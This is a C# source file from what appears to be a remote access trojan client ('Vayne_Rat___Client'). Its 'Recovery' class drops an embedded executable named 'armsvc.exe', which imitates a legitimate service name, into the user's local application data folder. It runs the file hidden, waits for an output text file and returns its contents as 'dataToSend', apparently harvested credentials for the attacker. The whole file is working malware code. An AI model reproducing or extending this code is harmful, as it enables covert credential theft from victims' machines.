using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace Vayne_Rat___Client
{
    public class Recovery
    {
        public static string manage()
        {
            byte[] b = Properties.Resources.armsvc;
            File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\armsvc.exe", b);

            System.Threading.Thread.Sleep(2000);
            System.Diagnostics.Process pwProcess = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo pwSInfo = new System.Diagnostics.ProcessStartInfo();
            pwSInfo.FileName = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\armsvc.exe";
            pwSInfo.CreateNoWindow = true;
            pwSInfo.UseShellExecute = false;
            pwSInfo.RedirectStandardInput = true;
            pwSInfo.RedirectStandardOutput = true;
            pwSInfo.RedirectStandardError = true;
            pwProcess.StartInfo = pwSInfo;
            pwProcess.Start();
            try
            {
                while(true)
                {
                    if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\armsvc.txt"))
                        break;
                }
                string dataToSend = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\armsvc.txt");
                pwProcess.Close();
                pwProcess.Dispose();
                return dataToSend;
            }
            catch (Exception ex)
            {
                return ex.Message+"|Error :-(|Error :-(";
            }
            
        }
    }
}
